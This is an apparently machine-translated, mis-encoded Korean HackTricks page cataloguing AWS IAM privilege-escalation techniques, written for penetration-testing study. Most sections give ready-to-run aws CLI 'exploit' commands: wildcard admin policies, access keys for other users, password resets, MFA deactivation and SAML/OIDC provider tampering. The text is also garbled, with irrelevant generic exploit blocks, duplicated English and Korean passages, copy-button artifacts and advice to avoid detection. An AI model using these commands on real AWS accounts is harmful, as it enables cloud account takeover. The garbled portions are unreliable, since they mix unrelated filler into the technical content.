# AWS - IAM ê¶Œí•œ ìƒìŠ¹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì„ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## IAM

IAMì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

`iam:SetDefaultPolicyVersion` ê¶Œí•œì´ í•„ìš”í•˜ì§€ ì•Šë„ë¡ `--set-as-default` í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ìƒˆ IAM ì •ì±… ë²„ì „ì„ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ë¶€ì—¬í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì‚¬ìš©ì ì •ì˜ ê¶Œí•œì„ ì •ì˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Exploit Command:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**ì˜í–¥:** ì–´ë–¤ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ì–´ë–¤ ì‘ì—…ì´ë“  ì§ì ‘ì ìœ¼ë¡œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚µë‹ˆë‹¤.

### **`iam:SetDefaultPolicyVersion`**

IAM ì •ì±…ì˜ ê¸°ë³¸ ë²„ì „ì„ ë‹¤ë¥¸ ê¸°ì¡´ ë²„ì „ìœ¼ë¡œ ë³€ê²½í•  ìˆ˜ ìˆê²Œ í•´ì£¼ë©°, ìƒˆ ë²„ì „ì— ë” ë§ì€ ê¶Œí•œì´ ìˆëŠ” ê²½ìš° ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Bash ëª…ë ¹ì–´:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**ì˜í–¥:** ë” ë§ì€ ê¶Œí•œì„ í™œì„±í™”í•˜ì—¬ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### **`iam:CreateAccessKey`**

ë‹¤ë¥¸ ì‚¬ìš©ìë¥¼ ìœ„í•´ ì•¡ì„¸ìŠ¤ í‚¤ IDì™€ ë¹„ë°€ ì•¡ì„¸ìŠ¤ í‚¤ë¥¼ ìƒì„±í•  ìˆ˜ ìˆë„ë¡ í•˜ì—¬ ì ì¬ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**ì˜í–¥:** ë‹¤ë¥¸ ì‚¬ìš©ìì˜ í™•ì¥ ê¶Œí•œì„ ê°€ì •í•˜ì—¬ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

AWS ì½˜ì†” ë¡œê·¸ì¸ì„ ìœ„í•œ ë¡œê·¸ì¸ í”„ë¡œí•„ì„ ìƒì„±í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•˜ëŠ” ê²ƒì„ í—ˆìš©í•˜ì—¬, ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ìƒì„±ì„ ìœ„í•œ Exploit:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**ì—…ë°ì´íŠ¸ë¥¼ ìœ„í•œ Exploit:**

```html
<details>
<summary>Exploit for Update</summary>

### Description:
This exploit takes advantage of a vulnerability in the update mechanism of the target system to gain unauthorized privileges.

### Steps to reproduce:
1. Identify the target system's update mechanism.
2. Analyze the update process to find any vulnerabilities.
3. Exploit the vulnerability to gain unauthorized privileges.

### Mitigation:
To mitigate this exploit, the target system should regularly update its software and ensure that the update mechanism is secure.

</details>
```

**ì„¤ëª…:**
ì´ Exploitì€ ëŒ€ìƒ ì‹œìŠ¤í…œì˜ ì—…ë°ì´íŠ¸ ë©”ì»¤ë‹ˆì¦˜ì˜ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ë¬´ë‹¨ ê¶Œí•œì„ ì–»ìŠµë‹ˆë‹¤.

**ì¬í˜„ ë°©ë²•:**
1. ëŒ€ìƒ ì‹œìŠ¤í…œì˜ ì—…ë°ì´íŠ¸ ë©”ì»¤ë‹ˆì¦˜ì„ ì‹ë³„í•©ë‹ˆë‹¤.
2. ì·¨ì•½ì ì„ ì°¾ê¸° ìœ„í•´ ì—…ë°ì´íŠ¸ í”„ë¡œì„¸ìŠ¤ë¥¼ ë¶„ì„í•©ë‹ˆë‹¤.
3. ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ë¬´ë‹¨ ê¶Œí•œì„ ì–»ìŠµë‹ˆë‹¤.

**ì™„í™” ë°©ë²•:**
ì´ Exploitì„ ì™„í™”í•˜ê¸° ìœ„í•´ì„œëŠ” ëŒ€ìƒ ì‹œìŠ¤í…œì´ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ì •ê¸°ì ìœ¼ë¡œ ì—…ë°ì´íŠ¸í•˜ê³  ì—…ë°ì´íŠ¸ ë©”ì»¤ë‹ˆì¦˜ì´ ì•ˆì „í•œì§€ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**ì˜í–¥:** "ì–´ë–¤" ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸í•˜ì—¬ ì§ì ‘ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### **`iam:UpdateAccessKey`**

ë¹„í™œì„±í™”ëœ ì•¡ì„¸ìŠ¤ í‚¤ë¥¼ í™œì„±í™”í•  ìˆ˜ ìˆê²Œ í•´ì£¼ë©°, ê³µê²©ìê°€ ë¹„í™œì„±í™”ëœ í‚¤ë¥¼ ì†Œìœ í•˜ê³  ìˆë‹¤ë©´ ë¬´ë‹¨ ì•¡ì„¸ìŠ¤ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Exploit:**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

**ì˜í–¥:** ì•¡ì„¸ìŠ¤ í‚¤ë¥¼ ì¬í™œì„±í™”í•˜ì—¬ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

íŠ¹ì • AWS ì„œë¹„ìŠ¤ (ì˜ˆ: CodeCommit, Amazon Keyspaces)ì— ëŒ€í•œ ìê²©ì¦ëª…ì„ ìƒì„±í•˜ê±°ë‚˜ ì¬ì„¤ì •í•  ìˆ˜ ìˆìœ¼ë©°, ê´€ë ¨ëœ ì‚¬ìš©ìì˜ ê¶Œí•œì„ ìƒì†í•©ë‹ˆë‹¤.

**ìƒì„±ì„ ìœ„í•œ Exploit:**

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
{% endcode %}

**ë¦¬ì…‹ì„ ìœ„í•œ ìµìŠ¤í”Œë¡œì‡:**

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**ì˜í–¥:** ì‚¬ìš©ìì˜ ì„œë¹„ìŠ¤ ê¶Œí•œ ë‚´ì—ì„œ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

ì‚¬ìš©ì ë˜ëŠ” ê·¸ë£¹ì— ì •ì±…ì„ ì²¨ë¶€í•  ìˆ˜ ìˆê²Œ í•´ì£¼ë©°, ì²¨ë¶€ëœ ì •ì±…ì˜ ê¶Œí•œì„ ìƒì†ë°›ì•„ ê¶Œí•œì„ ì§ì ‘ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì‚¬ìš©ìë¥¼ ìœ„í•œ Exploit:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**ê·¸ë£¹ì„ ìœ„í•œ Exploit:**

```plaintext
1. Identify the group with elevated privileges that you want to exploit.

2. Determine the permissions and policies associated with the group.

3. Look for misconfigurations or vulnerabilities that can be exploited to escalate privileges within the group.

4. Exploit any misconfigurations or vulnerabilities found to gain higher privileges within the group.

5. Once you have escalated privileges, take advantage of the additional permissions to access sensitive resources or perform unauthorized actions.

6. Be cautious and avoid detection while leveraging the elevated privileges.

7. Document your findings and report them to the appropriate parties for remediation.

8. Repeat the process for other groups with elevated privileges, if necessary.

Note: Always ensure you have proper authorization and legal permission before attempting any privilege escalation exploits.
```
```plaintext
1. ê³µê²©í•˜ë ¤ëŠ” ê¶Œí•œì´ ìƒìŠ¹ëœ ê·¸ë£¹ì„ ì‹ë³„í•©ë‹ˆë‹¤.

2. ê·¸ë£¹ê³¼ ê´€ë ¨ëœ ê¶Œí•œê³¼ ì •ì±…ì„ í™•ì¸í•©ë‹ˆë‹¤.

3. ê·¸ë£¹ ë‚´ì—ì„œ ê¶Œí•œ ìƒìŠ¹ì„ ìœ„í•´ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ì˜ëª»ëœ êµ¬ì„± ë˜ëŠ” ì·¨ì•½ì ì„ ì°¾ìŠµë‹ˆë‹¤.

4. ë°œê²¬ëœ ì˜ëª»ëœ êµ¬ì„± ë˜ëŠ” ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ ê·¸ë£¹ ë‚´ì—ì„œ ë” ë†’ì€ ê¶Œí•œì„ ì–»ìŠµë‹ˆë‹¤.

5. ê¶Œí•œ ìƒìŠ¹ í›„ ì¶”ê°€ ê¶Œí•œì„ í™œìš©í•˜ì—¬ ë¯¼ê°í•œ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ ë¬´ë‹¨ ì¡°ì¹˜ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.

6. ê¶Œí•œ ìƒìŠ¹ì„ í™œìš©í•˜ëŠ” ë™ì•ˆ ê°ì§€ë¥¼ í”¼í•˜ê³  ì¡°ì‹¬í•˜ì„¸ìš”.

7. ê²°ê³¼ë¥¼ ë¬¸ì„œí™”í•˜ê³  ì ì ˆí•œ ë‹¹ì‚¬ìì—ê²Œ ë³´ê³ í•˜ì—¬ ì¡°ì¹˜ë¥¼ ì·¨í•˜ë„ë¡ í•©ë‹ˆë‹¤.

8. í•„ìš”í•œ ê²½ìš° ë‹¤ë¥¸ ê¶Œí•œì´ ìƒìŠ¹ëœ ê·¸ë£¹ì— ëŒ€í•´ í”„ë¡œì„¸ìŠ¤ë¥¼ ë°˜ë³µí•©ë‹ˆë‹¤.

ì°¸ê³ : ê¶Œí•œ ìƒìŠ¹ ì•…ìš©ì„ ì‹œë„í•˜ê¸° ì „ì— í•­ìƒ ì ì ˆí•œ ì¸ê°€ì™€ ë²•ì  í—ˆê°€ë¥¼ í™•ë³´í•˜ì„¸ìš”.
```
```html
<ol>
<li>ê³µê²©í•˜ë ¤ëŠ” ê¶Œí•œì´ ìƒìŠ¹ëœ ê·¸ë£¹ì„ ì‹ë³„í•©ë‹ˆë‹¤.</li>
<li>ê·¸ë£¹ê³¼ ê´€ë ¨ëœ ê¶Œí•œê³¼ ì •ì±…ì„ í™•ì¸í•©ë‹ˆë‹¤.</li>
<li>ê·¸ë£¹ ë‚´ì—ì„œ ê¶Œí•œ ìƒìŠ¹ì„ ìœ„í•´ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ì˜ëª»ëœ êµ¬ì„± ë˜ëŠ” ì·¨ì•½ì ì„ ì°¾ìŠµë‹ˆë‹¤.</li>
<li>ë°œê²¬ëœ ì˜ëª»ëœ êµ¬ì„± ë˜ëŠ” ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ ê·¸ë£¹ ë‚´ì—ì„œ ë” ë†’ì€ ê¶Œí•œì„ ì–»ìŠµë‹ˆë‹¤.</li>
<li>ê¶Œí•œ ìƒìŠ¹ í›„ ì¶”ê°€ ê¶Œí•œì„ í™œìš©í•˜ì—¬ ë¯¼ê°í•œ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ ë¬´ë‹¨ ì¡°ì¹˜ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.</li>
<li>ê¶Œí•œ ìƒìŠ¹ì„ í™œìš©í•˜ëŠ” ë™ì•ˆ ê°ì§€ë¥¼ í”¼í•˜ê³  ì¡°ì‹¬í•˜ì„¸ìš”.</li>
<li>ê²°ê³¼ë¥¼ ë¬¸ì„œí™”í•˜ê³  ì ì ˆí•œ ë‹¹ì‚¬ìì—ê²Œ ë³´ê³ í•˜ì—¬ ì¡°ì¹˜ë¥¼ ì·¨í•˜ë„ë¡ í•©ë‹ˆë‹¤.</li>
<li>í•„ìš”í•œ ê²½ìš° ë‹¤ë¥¸ ê¶Œí•œì´ ìƒìŠ¹ëœ ê·¸ë£¹ì— ëŒ€í•´ í”„ë¡œì„¸ìŠ¤ë¥¼ ë°˜ë³µí•©ë‹ˆë‹¤.</li>
</ol>
```
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**ì˜í–¥:** ì •ì±…ì´ í—ˆìš©í•˜ëŠ” ëª¨ë“  ê²ƒì— ëŒ€í•œ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

ì—­í• , ì‚¬ìš©ì ë˜ëŠ” ê·¸ë£¹ì— ì •ì±…ì„ ì²¨ë¶€í•˜ê±°ë‚˜ ì •ì±…ì„ ì¶”ê°€í•˜ì—¬ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì„ í—ˆìš©í•©ë‹ˆë‹¤.

**ì—­í• ì„ ìœ„í•œ Exploit:**
```bash
bashCopy codeaws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**ì¸ë¼ì¸ ì •ì±…ì„ ì´ìš©í•œ ê³µê²©:**

An inline policy is a policy that is directly attached to an IAM user, group, or role. It is defined within the same JSON document as the user, group, or role. 

ì¸ë¼ì¸ ì •ì±…ì€ IAM ì‚¬ìš©ì, ê·¸ë£¹ ë˜ëŠ” ì—­í• ì— ì§ì ‘ ì—°ê²°ëœ ì •ì±…ì…ë‹ˆë‹¤. ì‚¬ìš©ì, ê·¸ë£¹ ë˜ëŠ” ì—­í• ê³¼ ë™ì¼í•œ JSON ë¬¸ì„œ ë‚´ì—ì„œ ì •ì˜ë©ë‹ˆë‹¤.

To exploit an inline policy, you need to have the necessary permissions to modify the policy document. Once you have the required permissions, you can modify the policy to grant yourself additional privileges.

ì¸ë¼ì¸ ì •ì±…ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ì •ì±… ë¬¸ì„œë¥¼ ìˆ˜ì •í•  ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤. í•„ìš”í•œ ê¶Œí•œì„ íšë“í•œ í›„ì—ëŠ” ì •ì±…ì„ ìˆ˜ì •í•˜ì—¬ ì¶”ê°€ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Here are the steps to exploit an inline policy:

ì¸ë¼ì¸ ì •ì±…ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ ë‹¨ê³„ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. Identify the IAM user, group, or role that has an inline policy attached.
2. Determine the permissions required to modify the policy document.
3. Gain the necessary permissions to modify the policy document.
4. Modify the policy document to grant yourself additional privileges.
5. Test the modified policy to ensure it works as intended.
6. Exploit the modified policy to escalate your privileges.

1. ì¸ë¼ì¸ ì •ì±…ì´ ì—°ê²°ëœ IAM ì‚¬ìš©ì, ê·¸ë£¹ ë˜ëŠ” ì—­í• ì„ ì‹ë³„í•©ë‹ˆë‹¤.
2. ì •ì±… ë¬¸ì„œë¥¼ ìˆ˜ì •í•˜ê¸° ìœ„í•´ í•„ìš”í•œ ê¶Œí•œì„ ê²°ì •í•©ë‹ˆë‹¤.
3. ì •ì±… ë¬¸ì„œë¥¼ ìˆ˜ì •í•˜ê¸° ìœ„í•´ í•„ìš”í•œ ê¶Œí•œì„ íšë“í•©ë‹ˆë‹¤.
4. ì •ì±… ë¬¸ì„œë¥¼ ìˆ˜ì •í•˜ì—¬ ì¶”ê°€ ê¶Œí•œì„ ë¶€ì—¬í•©ë‹ˆë‹¤.
5. ìˆ˜ì •ëœ ì •ì±…ì´ ì˜ë„í•œ ëŒ€ë¡œ ì‘ë™í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•©ë‹ˆë‹¤.
6. ìˆ˜ì •ëœ ì •ì±…ì„ ì•…ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚µë‹ˆë‹¤.
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
ë‹¤ìŒê³¼ ê°™ì€ ì •ì±…ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**ì˜í–¥:** ì •ì±…ì„ í†µí•´ ê¶Œí•œì„ ì¶”ê°€í•˜ì—¬ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### **`iam:AddUserToGroup`**

IAM ê·¸ë£¹ì— ìì‹ ì„ ì¶”ê°€í•˜ì—¬ ê·¸ë£¹ì˜ ê¶Œí•œì„ ìƒì†ë°›ì•„ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

**Exploit:**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**ì˜í–¥:** ê·¸ë£¹ ê¶Œí•œ ìˆ˜ì¤€ê¹Œì§€ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### **`iam:UpdateAssumeRolePolicy`**

ì—­í• ì˜ ê°€ì • ì—­í•  ì •ì±… ë¬¸ì„œë¥¼ ë³€ê²½í•˜ì—¬ ì—­í• ì˜ ê°€ì •ê³¼ ê´€ë ¨ëœ ê¶Œí•œì„ í™œì„±í™”í•˜ëŠ” ê²ƒì„ í—ˆìš©í•©ë‹ˆë‹¤.

**ì•…ìš©:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
ë‹¤ìŒê³¼ ê°™ì´ ì •ì±…ì´ êµ¬ì„±ë˜ì–´ ìˆëŠ” ê²½ìš°, ì‚¬ìš©ìì—ê²Œ ì—­í• ì„ ê°€ì •í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì´ ë¶€ì—¬ë©ë‹ˆë‹¤:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**ì˜í–¥:** ì–´ë–¤ ì—­í• ì˜ ê¶Œí•œì„ ê°€ì •í•˜ì—¬ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

CodeCommitì— ì¸ì¦í•˜ê¸° ìœ„í•´ SSH ê³µê°œ í‚¤ë¥¼ ì—…ë¡œë“œí•˜ê³  MFA ì¥ì¹˜ë¥¼ ë¹„í™œì„±í™”í•˜ëŠ” ê²ƒì„ í—ˆìš©í•˜ì—¬ ì ì¬ì ì¸ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**SSH í‚¤ ì—…ë¡œë“œë¥¼ ìœ„í•œ Exploit:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**MFA ë¹„í™œì„±í™”ë¥¼ ìœ„í•œ Exploit:**

```html
1. Identify an IAM user with the necessary permissions to modify MFA settings.
2. Obtain the access key and secret key of the identified IAM user.
3. Configure the AWS CLI with the obtained credentials.
4. Use the following command to disable MFA for the targeted IAM user:

   ```
   aws iam deactivate-mfa-device --user-name <IAM_USER_NAME> --serial-number <MFA_SERIAL_NUMBER>
   ```

   Replace `<IAM_USER_NAME>` with the username of the targeted IAM user and `<MFA_SERIAL_NUMBER>` with the serial number of the MFA device associated with the user.
5. Verify that MFA has been successfully disabled by attempting to log in without the MFA code.
```

**ë²ˆì—­:**

```html
1. MFA ì„¤ì •ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” í•„ìš”í•œ ê¶Œí•œì„ ê°€ì§„ IAM ì‚¬ìš©ìë¥¼ ì‹ë³„í•©ë‹ˆë‹¤.
2. ì‹ë³„ëœ IAM ì‚¬ìš©ìì˜ ì•¡ì„¸ìŠ¤ í‚¤ì™€ ì‹œí¬ë¦¿ í‚¤ë¥¼ íšë“í•©ë‹ˆë‹¤.
3. íšë“í•œ ìê²© ì¦ëª…ìœ¼ë¡œ AWS CLIë¥¼ êµ¬ì„±í•©ë‹ˆë‹¤.
4. ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ëŒ€ìƒ IAM ì‚¬ìš©ìì˜ MFAë¥¼ ë¹„í™œì„±í™”í•©ë‹ˆë‹¤:

   ```
   aws iam deactivate-mfa-device --user-name <IAM_USER_NAME> --serial-number <MFA_SERIAL_NUMBER>
   ```

   `<IAM_USER_NAME>`ì„ ëŒ€ìƒ IAM ì‚¬ìš©ìì˜ ì‚¬ìš©ì ì´ë¦„ìœ¼ë¡œ, `<MFA_SERIAL_NUMBER>`ë¥¼ ì‚¬ìš©ìì™€ ì—°ê²°ëœ MFA ì¥ì¹˜ì˜ ì¼ë ¨ ë²ˆí˜¸ë¡œ ëŒ€ì²´í•©ë‹ˆë‹¤.
5. MFA ì½”ë“œ ì—†ì´ ë¡œê·¸ì¸ì„ ì‹œë„í•˜ì—¬ MFAê°€ ì„±ê³µì ìœ¼ë¡œ ë¹„í™œì„±í™”ë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
```
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**ì˜í–¥:** CodeCommit ì ‘ê·¼ ê¶Œí•œ í™œì„±í™” ë˜ëŠ” MFA ë³´í˜¸ ë¹„í™œì„±í™”ë¡œ ì¸í•œ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### **`iam:ResyncMFADevice`**

MFA ì¥ì¹˜ì˜ ë™ê¸°í™”ë¥¼ í—ˆìš©í•˜ì—¬ MFA ë³´í˜¸ë¥¼ ì¡°ì‘í•˜ì—¬ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Bash Command:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**ì˜í–¥:** MFA ì¥ì¹˜ë¥¼ ì¶”ê°€í•˜ê±°ë‚˜ ì¡°ì‘í•¨ìœ¼ë¡œì¨ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

ì´ëŸ¬í•œ ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´, SAML ì—°ê²°ì˜ XML ë©”íƒ€ë°ì´í„°ë¥¼ **ë³€ê²½**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, SAML ì—°í•©ì„ **ë‚¨ìš©**í•˜ì—¬ ì‹ ë¢°í•˜ëŠ” **ëª¨ë“  ì—­í• ë¡œ ë¡œê·¸ì¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì‘ì—…ì„ ìˆ˜í–‰í•˜ë©´ **í•©ë²•ì ì¸ ì‚¬ìš©ìëŠ” ë¡œê·¸ì¸í•  ìˆ˜ ì—†ê²Œ ë©ë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ XMLì„ ì–»ì„ ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ìì‹ ì˜ XMLì„ ë„£ê³  ë¡œê·¸ì¸í•œ ë‹¤ìŒ ì´ì „ ì„¤ì •ì„ ë³µêµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
í•  ì¼: ì§€ì •ëœ ì—­í• ë¡œ SAML ë©”íƒ€ë°ì´í„°ë¥¼ ìƒì„±í•˜ê³  ë¡œê·¸ì¸í•  ìˆ˜ ìˆëŠ” ë„êµ¬
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(í™•ì‹¤í•˜ì§€ ì•ŠìŒ) ê³µê²©ìê°€ ì´ëŸ¬í•œ **ê¶Œí•œ**ì„ ê°€ì§€ê³  ìˆë‹¤ë©´, ìƒˆë¡œìš´ **Thumbprint**ë¥¼ ì¶”ê°€í•˜ì—¬ ê³µê¸‰ìë¥¼ ì‹ ë¢°í•˜ëŠ” ëª¨ë“  ì—­í• ì— ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

## ì°¸ê³  ìë£Œ

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

